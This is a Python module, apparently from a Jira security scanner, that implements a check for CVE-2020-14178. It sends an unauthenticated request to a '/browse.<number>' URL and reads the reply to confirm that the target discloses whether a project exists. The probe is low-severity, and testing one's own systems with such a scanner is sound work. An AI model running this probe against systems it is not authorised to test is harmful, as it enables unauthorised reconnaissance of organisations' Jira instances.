#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
from jiraffe.exploits.base import Exploit
from jiraffe.enums import Severity


class CVE202014178(Exploit):
    cve = "CVE-2020-14178"
    severity = Severity.LOW
    description = "Unauthenticated project existence disclosure"

    def check(self) -> bool:
        key = random.randint(100, 999)
        r = self.client.get(f"{self.target}/browse.{key}")
        return "project does not exist" in r.text.lower()

    def exploit(self) -> None:
        print("[*] Project existence disclosure confirmed")
